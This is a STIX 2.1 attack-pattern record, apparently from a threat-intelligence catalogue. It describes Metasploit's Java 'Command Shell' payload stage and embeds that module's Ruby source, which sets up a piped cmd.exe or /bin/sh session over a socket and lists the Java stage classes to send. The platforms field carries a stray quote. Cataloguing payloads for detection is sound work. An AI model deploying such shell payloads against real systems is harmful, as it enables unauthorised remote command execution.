{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f88c4870-6320-44e0-83c5-ebe4af7a3338",
    "created": "2024-08-14T16:33:19.26303Z",
    "modified": "2024-08-14T16:33:19.263033Z",
    "name": "Command Shell",
    "description": "Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/java/shell.rb",
            "external_id": "shell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Command Shell',\n      'Description'   => 'Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else)',\n      'Author'        => ['mihi', 'egypt'],\n      'Platform'      => 'java',\n      'Arch'          => ARCH_JAVA,\n      'PayloadCompat' => {'Convention' => 'javasocket'},\n      'License'       => MSF_LICENSE,\n      'Session'       => Msf::Sessions::CommandShell))\n  end\n\n  def stage_class_files\n    # Order matters.  Classes can only reference classes that have already\n    # been sent.  The last .class must implement Stage, i.e. have a start()\n    # method.\n    [\n      [ \"javapayload\", \"stage\", \"Stage.class\" ],\n      [ \"javapayload\", \"stage\", \"StreamForwarder.class\" ],\n      [ \"javapayload\", \"stage\", \"Shell.class\" ],\n    ]\n  end\nend\n",
    "x_mitre_platforms": [
        "java'"
    ]
}